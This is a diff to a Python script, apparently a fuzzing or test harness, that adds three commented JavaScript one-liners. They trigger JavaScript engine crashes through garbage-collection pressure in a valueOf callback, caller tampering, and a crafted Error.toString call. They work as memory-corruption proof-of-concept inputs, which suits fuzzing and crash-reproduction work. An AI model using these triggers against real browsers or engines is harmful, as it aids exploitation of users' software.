@@ -218,4 +218,7 @@ for u in range(int(sys.argv[-1])):
 #    mod += '/tc/modules'
 #if dbg: print mod + '\n\n\n'
 
+# function gc() {eval("var a = Object(); var b = Object(); var s='a'; for(var i=0; i < 0x800; i++){s=s.replace('a', 'aaaaaaaa')};");}; var x = Object(); x.toString = function(){String.fromCharCode(0x43)+String.fromCharCode(0x41);}; var l=Object(); l.valueOf=function(){gc(); return 1;}; String.prototype.slice.call(x, l);
+# function crash() {function gc() {eval("var a = Object(); var b = Object(); var s='a'; for(var i=0; i < 0x800; i++){s=s.replace('a', 'aaaaaaaa')};");}; var x = Object(); x.toString = function(){String.fromCharCode(0x43)+String.fromCharCode(0x41);}; var l=Object(); l.valueOf=function(){gc(); return 1;}; String.prototype.slice.call(x, l);}function xx() {xx.caller = new Function('return 1;');}function yy() { if (yy.caller() !== 1)        crash();}function main() {    xx();    xx.caller = null;    var tmp = 'b';    for (var i = 0; i < 0x800; i++) {        tmp = tmp.replace('b', 'bbbbbbbb');    }    for (var i = 0; i < 200; i++) {       new Function('return 0;');    }    yy();}main();
+# (new Error()).toString.call({message: 0x41414141 >> 1})
 
